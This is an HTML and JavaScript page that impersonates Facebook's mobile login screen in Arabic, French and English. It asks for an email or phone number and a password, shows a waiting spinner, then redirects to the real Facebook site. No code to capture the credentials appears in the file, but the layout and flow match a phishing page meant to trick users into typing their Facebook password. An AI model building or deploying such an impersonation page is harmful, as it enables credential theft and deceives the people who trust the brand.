<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background: #f0f2f5;
      padding: 10px;
    }

    .header {
      text-align: center;
      padding: 20px 0 10px;
    }
    .header h1 {
      color: #1877f2;
      font-size: 36px;
      margin: 0;
      font-weight: bold;
    }

    .lang-box {
      text-align: center;
      margin-bottom: 15px;
    }
    .lang-box select {
      padding: 8px 12px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 14px;
      cursor: pointer;
      width: 100%;
      max-width: 200px;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 10px;
    }

    .login-box {
      background: #fff;
      padding: 15px;
      border-radius: 8px;
      width: 100%;
      max-width: 360px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
      text-align: center;
      position: relative;
    }

    .input-wrapper {
      position: relative;
      width: 100%;
      margin-bottom: 12px;
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      border-radius: 6px;
      border: 1px solid #dddfe2;
      font-size: 16px;
    }

    .popup {
      position: absolute;
      top: -28px;
      left: 10px;
      background: #000;
      color: #fff;
      padding: 6px 10px;
      border-radius: 6px;
      font-size: 13px;
      white-space: nowrap;
      display: none;
    }
    .popup::after {
      content: "";
      position: absolute;
      bottom: -6px;
      left: 15px;
      border-width: 6px;
      border-style: solid;
      border-color: #000 transparent transparent transparent;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: none;
      border-radius: 6px;
      background: #1877f2;
      color: #fff;
      font-weight: bold;
      font-size: 18px;
      cursor: pointer;
    }
    .login-box button:hover {
      background: #166fe5;
    }

    .msg {
      margin-top: 15px;
      font-weight: bold;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      visibility: hidden;
      font-size: 14px;
    }

    .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid #ccc;
      border-top: 2px solid #1877f2;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    .create-account {
      margin-top: 15px;
      font-size: 14px;
    }
    .create-account a {
      color: #1877f2;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="header">
    <h1>facebook</h1>
  </div>

  <div class="lang-box">
    <select id="languageSwitcher">
      <option value="ar" selected>العربية</option>
      <option value="fr">Français</option>
      <option value="en">English</option>
    </select>
  </div>

  <div class="container">
    <div class="login-box">
      <form id="myForm">
        <div class="input-wrapper">
          <input type="text" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف">
          <div class="popup" id="emailPopup"></div>
        </div>

        <div class="input-wrapper">
          <input type="password" id="passwordInput" placeholder="كلمة المرور">
          <div class="popup" id="passwordPopup"></div>
        </div>

        <button type="submit" id="loginBtn">تسجيل الدخول</button>
      </form>

      <div class="msg" id="msg">
        <div class="spinner"></div> <span id="waitMsg">يرجى الإنتظار...</span>
      </div>

      <div class="create-account">
        <span id="noAccount">ليس لديك حساب؟</span>
        <a href="https://m.facebook.com/reg/" id="createAccount">إنشاء حساب جديد</a>
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById("myForm");
    const emailInput = document.getElementById("emailInput");
    const passwordInput = document.getElementById("passwordInput");
    const emailPopup = document.getElementById("emailPopup");
    const passwordPopup = document.getElementById("passwordPopup");
    const msg = document.getElementById("msg");
    const langSwitcher = document.getElementById("languageSwitcher");

    const translations = {
      ar: {
        email: "البريد الإلكتروني أو رقم الهاتف",
        password: "كلمة المرور",
        login: "تسجيل الدخول",
        wait: "يرجى الإنتظار...",
        noAccount: "ليس لديك حساب؟",
        create: "إنشاء حساب جديد",
        emailError: "أدخل رقم أو إيميل صحيح",
        passError: "يرجى إدخال كلمة المرور الصحيحة"
      },
      fr: {
        email: "E-mail ou numéro de téléphone",
        password: "Mot de passe",
        login: "Se connecter",
        wait: "Veuillez patienter...",
        noAccount: "Vous n'avez pas de compte ?",
        create: "Créer un nouveau compte",
        emailError: "Veuillez entrer un email ou numéro valide",
        passError: "Veuillez entrer un mot de passe correct"
      },
      en: {
        email: "Email or Phone",
        password: "Password",
        login: "Log In",
        wait: "Please wait...",
        noAccount: "Don't have an account?",
        create: "Create New Account",
        emailError: "Enter a valid email or phone",
        passError: "Please enter the correct password"
      }
    };

    let currentLang = "ar";

    function changeLanguage(lang) {
      currentLang = lang;
      emailInput.placeholder = translations[lang].email;
      passwordInput.placeholder = translations[lang].password;
      document.getElementById("loginBtn").innerText = translations[lang].login;
      document.getElementById("waitMsg").innerText = translations[lang].wait;
      document.getElementById("noAccount").innerText = translations[lang].noAccount;
      document.getElementById("createAccount").innerText = translations[lang].create;

      emailPopup.style.display = "none";
      passwordPopup.style.display = "none";

      document.documentElement.dir = (lang === "ar") ? "rtl" : "ltr";
      document.documentElement.lang = lang;
    }

    langSwitcher.addEventListener("change", e => {
      changeLanguage(e.target.value);
    });

    form.addEventListener("submit", e => {
      e.preventDefault();
      let valid = true;

      if (emailInput.value.trim() === "") {
        emailPopup.innerText = translations[currentLang].emailError;
        emailPopup.style.display = "block";
        valid = false;
      } else {
        emailPopup.style.display = "none";
      }

      if (passwordInput.value.trim() === "") {
        passwordPopup.innerText = translations[currentLang].passError;
        passwordPopup.style.display = "block";
        valid = false;
      } else {
        passwordPopup.style.display = "none";
      }

      if (!valid) return;

      msg.style.visibility = "visible";
      setTimeout(() => {
        window.location.href = "https://m.facebook.com";
      }, 1500);
    });
  </script>

</body>
</html>
